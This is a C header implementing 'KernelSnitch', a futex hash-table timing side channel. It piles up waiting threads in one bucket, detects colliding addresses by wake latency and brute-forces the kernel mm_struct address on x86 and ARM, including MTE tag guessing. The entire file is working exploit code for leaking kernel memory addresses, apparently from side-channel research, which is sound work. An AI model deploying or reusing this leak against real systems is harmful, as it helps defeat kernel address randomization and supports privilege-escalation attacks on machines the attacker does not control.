#pragma once

#include "futex_hash.h"
#include "timeutils.h"
#include "utils.h"

#include <assert.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>

/* __ARM is not compiler-predefined on aarch64 (that is __aarch64__); it
 * is hand-defined in common.h.  Any TU that reaches this header without
 * common.h would silently fall through to the x86 IDENTITY_START below,
 * scanning the wrong 64 GB window.  Self-contain the guard. */
#if defined(__aarch64__) && !defined(__ARM)
#define __ARM 1
#endif
#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
#define __INTEL
#endif

#define FUTEX_SZ (64ULL << 30)
#define FUTEX_MMAP_SZ (1ULL << 30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#define APPENDED_FUTEXES 4096
#define MULITPLE 4
/* Hash-bucket pile target inside ks->inc_futex. */
#define KSNITCH_PILE_ID 128
#if defined(__INTEL) || defined(__AMD)
#define IDENTITY_START 0xffff888000000000ULL
#define IDENTITY_END 0xffffc88000000000ULL
#define COARSE_SZ (1ULL << 30)
#elif defined(__ARM)
#define VA_BITS 39
#if VA_BITS == 39
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL << 30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END KERNELSNITCH_IDENTITY_END
// #define IDENTITY_END   0xffffffc000000000ULL
#elif VA_BITS == 48
#define IDENTITY_START 0xffff000000000000ULL
#define IDENTITY_END 0xffff800000000000ULL
#else
#error "Unsupported VA_BITS (expected 39 or 48)"
#endif
#define COARSE_SZ (1ULL << 30)
#endif

enum kernelsnitch_state {
  KERNELSNITCH_NOT_INIT = 0,
  KERNELSNITCH_INIT,
  KERNELSNITCH_COLLISIONS_FOUND,
  KERNELSNITCH_COLLISIONS_NOT_FOUND,
  KERNELSNITCH_MM_FOUND,
  KERNELSNITCH_MM_NOT_FOUND,
  KERNELSNITCH_LAST,
};
static char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
    "not initialized",      "initialized",     "collisions found",
    "collisions not found", "mm_struct found", "mm_struct not found",
};

struct kernelsnitch_shared_state {
  volatile size_t mm_struct_sz;
  volatile size_t mm_slab_order;
  volatile size_t verbose;

  size_t collisions;
  size_t thread_cnt;
  size_t cpu_cnt;
  size_t futex_hash_table_size;
  size_t total_futexes;

  volatile unsigned char *futexes;
  volatile unsigned char inc_futex[KS_PAGE_SIZE];

  volatile size_t *futex_addrs;
  volatile size_t *times;
  volatile size_t found;
  volatile size_t mm_struct;

  pthread_t *tids;
  size_t identity_diff;

  enum kernelsnitch_state state;

  int mte_enabled;
};

/* Wait until the piled-up waiters have actually reached FUTEX_WAIT.
 * Poll /proc/self/status until the thread count stops growing; fall back
 * to a fixed settle if /proc is unavailable. */
static size_t __proc_thread_count(void) {
  char buf[4096];
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  buf[n] = '\0';
  const char *p = strstr(buf, "Threads:");
  if (!p)
    return 0;
  return strtoul(p + 8, NULL, 10);
}

static void __wait_pile_formed(void) {
  size_t prev = __proc_thread_count();
  if (prev == 0) {
    usleep(200000); /* /proc unavailable: conservative fixed settle */
    return;
  }
  unsigned stable = 0;
  for (unsigned round = 0; round < 50; ++round) { /* cap ~250ms */
    usleep(5000);
    size_t now = __proc_thread_count();
    if (now == 0) {
      usleep(200000);
      return;
    }
    if (now == prev) {
      if (++stable >= 3)
        return;
    } else {
      stable = 0;
      prev = now;
    }
  }
}

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val,
                   const struct timespec *timeout, unsigned int *uaddr2,
                   unsigned int val3) {
  return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of
 * futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the
 * increase
 */
struct inc_arg {
  struct kernelsnitch_shared_state *ks;
  size_t id;
};
static void *__do_increase(void *arg) {
  struct inc_arg *inc_arg = (struct inc_arg *)arg;
  struct kernelsnitch_shared_state *ks = inc_arg->ks;
  size_t id = inc_arg->id;
  /* FUTEX_WAIT returns -1/EAGAIN when the word at uaddr is already
   * non-zero, i.e. the waiter arrived after the FUTEX_WAKE.  That is
   * not a failure, the pile just has one fewer waiter. */
  if (__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL,
              NULL, 0) != 0 &&
      errno != EAGAIN)
    pr_warning(
        "kernelsnitch: pile waiter %zu futex wait failed errno=%d (%s)\n", id,
        errno, strerror(errno));
  free(inc_arg);
  return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the
 * increase
 * @arg amount: increase
 */
static void __increase(struct kernelsnitch_shared_state *ks, size_t id,
                       size_t amount) {
  pthread_t tid;
  for (size_t i = 0; i < amount; ++i) {
    struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
    inc_arg->id = id;
    inc_arg->ks = ks;
    /* pthread_create reports failure as a positive rc, never -1, so
     * SYSCHK() cannot catch it: a dead check.  A shallow pile only
     * weakens the collision signal, so warn and continue rather than
     * crashing the whole leak. */
    int rc = pthread_create(&tid, 0, __do_increase, (void *)inc_arg);
    if (rc != 0) {
      pr_warning("kernelsnitch: pile thread %zu create failed rc=%d (%s)\n", i,
                 rc, strerror(rc));
      free(inc_arg);
    }
  }
  __wait_pile_formed();
}

/**
 * Simple compare
 */
/* The discriminator is the minimum wake latency of a bucket traversal;
 * average the lowest samples only. */
#define REPEAT_MEASUREMENT 16
#define AVERAGE (1 << 1)
static int __compare(const void *a, const void *b) {
  return (*(const size_t *)a > *(const size_t *)b) -
         (*(const size_t *)a < *(const size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket
 * futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a
 * mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(size_t futex_addr) {
  size_t t0;
  size_t t1;
  size_t time = 0;
  // do some simple signal processing and reject bad ones
  size_t __times[REPEAT_MEASUREMENT];
  for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
    t0 = rdtsc_begin();
    SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL,
                   NULL, 0));
    t1 = rdtsc_end();
    __times[l] = t1 - t0;
  }
  qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
  for (size_t l = 0; l < AVERAGE; ++l)
    time += __times[l];
  time /= AVERAGE;
  return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
  size_t id;
  size_t start;
  size_t end;
};
struct mm_leak_arg {
  struct kernelsnitch_shared_state *ks;
  struct range range;
};
static void *__mm_leak(void *arg) {
  struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
  struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
  struct range *range = &mm_leak_arg->range;
  if (ks->verbose)
    pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id,
            range->start, range->end);
  size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
  /* Snapshot the collision table once: find_collisions writes it before
   * bruteforce starts and it never changes after, but it is declared
   * volatile, so indexing it in the candidate loop forces a shared-mmap
   * reload per iteration and keeps the h0 hash from being hoisted. */
  size_t *local_addrs = (size_t *)malloc(sizeof(size_t) * (ks->collisions + 1));
  if (!local_addrs) {
    pr_warning("kernelsnitch: [% 3zd] snapshot alloc failed\n", range->id);
    free(mm_leak_arg);
    return 0;
  }
  for (size_t i = 0; i <= ks->collisions; ++i)
    local_addrs[i] = ks->futex_addrs[i];
  for (size_t coarse_addr = range->start;
       (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
    if ((coarse_addr % (1ULL << 40)) == 0)
      if (ks->verbose)
        pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr,
                coarse_addr + (1ULL << 40));
    for (size_t slab_addr = coarse_addr;
         (slab_addr < coarse_addr + COARSE_SZ) && !ks->found;
         slab_addr += mm_slab_sz) {
      for (size_t mm_struct_candidate = slab_addr;
           (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found;
           mm_struct_candidate += ks->mm_struct_sz) {

        size_t found_hash = 1;
        if (!ks->mte_enabled) {
          // test the mm_struct candidate
          uint32_t h0 = futex_hash(local_addrs[0], mm_struct_candidate);
          for (size_t i = 1; i < ks->collisions && found_hash; ++i)
            found_hash =
                (h0 == futex_hash(local_addrs[i], mm_struct_candidate));
          if (found_hash) {
            ks->mm_struct = mm_struct_candidate;
            ks->found = 1;
            break;
          }
        } else {
          // need to set the tag if mte is enabled
          for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found;
               ++tag_candidate) {
            size_t __mm_struct_candidate =
                mm_struct_candidate & ~(0xfULL << 56);
            __mm_struct_candidate |= (tag_candidate << 56);
            found_hash = 1;
            uint32_t h0 = futex_hash(local_addrs[0], __mm_struct_candidate);
            for (size_t i = 1; i < ks->collisions && found_hash; ++i)
              found_hash =
                  (h0 == futex_hash(local_addrs[i], __mm_struct_candidate));
            if (found_hash) {
              if (ks->verbose)
                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
              ks->mm_struct = __mm_struct_candidate;
              ks->found = 1;
              break;
            }
          }
        }
      }
    }
  }
  free(local_addrs);
  free(mm_leak_arg);
  return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct
 * address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled;
 * 0...disabled)
 * @return shared KernelSnitch state
 */
static inline struct kernelsnitch_shared_state *
kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order,
                   size_t __thread_cnt, size_t __collision_cnt,
                   size_t __verbose, size_t __mte_enabled) {
  struct kernelsnitch_shared_state *ks =
      SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state),
                  PROT_WRITE | PROT_READ, MAP_ANON | MAP_SHARED, -1, 0));
  ks->mm_struct = (size_t)-1; /* sentinel: not found yet */
  ks->mm_struct_sz = __mm_struct_sz;
  ks->mm_slab_order = __mm_slab_order;
  ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN) * 2;
  ks->thread_cnt = __thread_cnt;
  ks->collisions = __collision_cnt;
  ks->verbose = __verbose;
  ks->mte_enabled = __mte_enabled;

  // unfortunately I have to use a the kernelsnitch_shared_state and
  // mmap(shared) as find collisions and bruteforce might be in different
  // processes!!!
  /* Scan bound deliberately larger than the kernel's 256*possible table
   * (cpu_cnt = 2*online, plus MULITPLE headroom); the scan exits early
   * once the wanted collisions are found. */
  ks->futex_hash_table_size = 256 * ks->cpu_cnt;
  ks->total_futexes = ks->futex_hash_table_size * ks->collisions * MULITPLE;
  ks->times = (volatile size_t *)SYSCHK(
      mmap(0, sizeof(size_t) * ks->total_futexes, PROT_WRITE | PROT_READ,
           MAP_ANON | MAP_SHARED, -1, 0));
  ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t) * ks->thread_cnt,
                                      PROT_WRITE | PROT_READ,
                                      MAP_ANON | MAP_SHARED, -1, 0));
  ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE,
                            MAP_ANON | MAP_PRIVATE | MAP_NORESERVE, -1, 0));
  for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
    SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ,
                PROT_WRITE | PROT_READ, MAP_ANON | MAP_SHARED | MAP_FIXED, -1,
                0));
  ks->identity_diff = ((IDENTITY_END - IDENTITY_START) / ks->thread_cnt);

  ks->futex_addrs = (volatile size_t *)SYSCHK(
      mmap(0, sizeof(size_t) * (ks->collisions + 1), PROT_WRITE | PROT_READ,
           MAP_ANON | MAP_SHARED, -1, 0));

  if (ks->verbose)
    pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) "
            "thread cnt (%zd) collisions (%zd) mte %s\n",
            ks->cpu_cnt, ks->mm_struct_sz, ks->mm_slab_order, ks->thread_cnt,
            ks->collisions, ks->mte_enabled ? "enabled" : "disabled");
  pin_to_core(0);
  futex_init();

  ks->state = KERNELSNITCH_INIT;
  return ks;
}

/**
 * Find collisions for different user space futex addresses within one process
 * and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
static inline void
kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks) {
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 10
#endif
  size_t count = 0;
  size_t wanted;
  size_t futex_addr;
  size_t id;
  ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
  ASSERT_pr((ks->collisions >= 2), "need at least two collisions\n");
  wanted = ks->collisions - 1;

  size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]),
                           __measure((size_t)&ks->futexes[KS_PAGE_SIZE + 8]));

  // piled-up hash bucket ID 128
  // here, I append 4096 futexes to this hash bucket creating a distinction
  // between most other empty or lightly populated ones
  __increase(ks, KSNITCH_PILE_ID, APPENDED_FUTEXES);
  if (ks->verbose)
    pr_info("start finding collisions\n");

  // find futex user space address which collide with the piled-up hash bucket
  // ID 128
  ks->futex_addrs[0] = (size_t)&ks->inc_futex[KSNITCH_PILE_ID];
  if (ks->verbose)
    pr_info("target    %016zx\n", ks->futex_addrs[0]);
  for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
    id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
    if (id >= FUTEX_SZ)
      break;
    futex_addr = (size_t)&ks->futexes[id];
    ks->times[i] = __measure(futex_addr);
    if (ks->times[i] > (approx_time * KERNELSNITCH_THRESHOLD_MULT)) {
      count++;
      ks->futex_addrs[count] = futex_addr;
    }
  }
  if (wanted == count) {
    if (ks->verbose)
      pr_info("found %zd collisions\n", count);
    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
  } else {
    pr_warning("only found %zd collisions -> cannot continue\n", count);
    ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
  }
}
static inline size_t
kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks) {
  ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND ||
             ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND),
            "wrong state\n");
  return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the
 * hash collisions for this current candidate with the observed user space futex
 * addresses
 * @arg ks: shared KernelSnitch state
 */
static inline void
kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks) {
  ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
  if (ks->verbose)
    pr_info("start bruteforcing\n");
  reset_cpu_pin();

  size_t created = 0;
  for (size_t i = 0; i < ks->thread_cnt; ++i) {
    struct mm_leak_arg *mm_leak_arg =
        (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
    mm_leak_arg->ks = ks;
    mm_leak_arg->range.id = i;
    mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff * i;
    mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff * (i + 1);
    if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
      mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
    if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
      mm_leak_arg->range.end =
          ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
    /* Same SYSCHK pitfall as __increase: pthread_create fails with a
     * positive rc.  Losing a scan range only reduces coverage (the
     * leak stays valid if any other thread finds it); join only the
     * threads that were actually created. */
    int rc = pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg);
    if (rc != 0) {
      pr_warning("kernelsnitch: scan thread %zu create failed rc=%d (%s)\n", i,
                 rc, strerror(rc));
      free(mm_leak_arg);
      break;
    }
    created++;
  }
  for (size_t i = 0; i < created; ++i)
    pthread_join(ks->tids[i], 0);
  ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND
                                            : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
static inline size_t
kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks) {
  /* COLLISIONS_NOT_FOUND is legal here: cleanup also runs after a
   * failed collision search. */
  ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND ||
             ks->state == KERNELSNITCH_MM_FOUND ||
             ks->state == KERNELSNITCH_MM_NOT_FOUND),
            "wrong state\n");
  /* Wake the piled-up futex waiters before unmapping the state they are
   * blocked on. Without this they sleep forever and every prepare leaks
   * APPENDED_FUTEXES zombie threads (slows subsequent in-process leaks). */
  __futex((unsigned int *)&ks->inc_futex[KSNITCH_PILE_ID], FUTEX_WAKE_PRIVATE,
          APPENDED_FUTEXES, NULL, NULL, 0);
  munmap((void *)ks->times, sizeof(size_t) * ks->total_futexes);
  ks->times = 0;
  munmap((void *)ks->tids, sizeof(pthread_t) * ks->thread_cnt);
  ks->tids = 0;
  munmap((void *)ks->futex_addrs, sizeof(size_t) * (ks->collisions + 1));
  ks->futex_addrs = 0;
  munmap((void *)ks->futexes, FUTEX_SZ);
  ks->futexes = 0;
  size_t ret = ks->mm_struct;
  if (ks->verbose)
    pr_info("done\n");
  munmap(ks, sizeof(struct kernelsnitch_shared_state));
  return ret;
}

/**
 * Performs KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct
 * address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled;
 * 0...disabled)
 * @return the found mm_struct or -1 for not found
 */
static inline size_t
kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order,
                   size_t __thread_cnt, size_t __collision_cnt,
                   size_t __verbose, size_t __mte_enabled) {
  struct kernelsnitch_shared_state *ks =
      kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt,
                         __collision_cnt, __verbose, __mte_enabled);
  if (ks->verbose)
    pr_info("===============================================\n");
  kernelsnitch_find_collisions(ks);
  if (ks->verbose)
    pr_info("===============================================\n");
  kernelsnitch_bruteforce(ks);
  if (ks->verbose)
    pr_info("===============================================\n");
  return kernelsnitch_cleanup(ks);
}

/**
 * Prints the current execution state KernelSnitch is in
 * @arg ks: shared KernelSnitch state
 */
static inline void
kernelsnitch_print_state(struct kernelsnitch_shared_state *ks) {
  if (ks->verbose)
    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
}

/**
 * Prints the found collisions
 * @arg ks: shared KernelSnitch state
 */
static inline void
kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks) {
  if (!ks->verbose)
    return;
  pr_info("collisions:\n");
  /* Start at 1 so the whole set is printed (the first collision
   * found is stored at index 1). */
  for (size_t i = 1; i < ks->collisions; ++i) {
    size_t addr = ks->futex_addrs[i];
    pr_info("  %016zx\n", addr);
  }
}

/**
 * KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @return: the found mm_struct address
 */
static inline size_t kernelsnitch(size_t __mm_struct_sz,
                                  size_t __mm_slab_order) {
  return kernelsnitch_param(__mm_struct_sz, __mm_slab_order,
                            sysconf(_SC_NPROCESSORS_ONLN) * 2, 16, 0, 0);
}
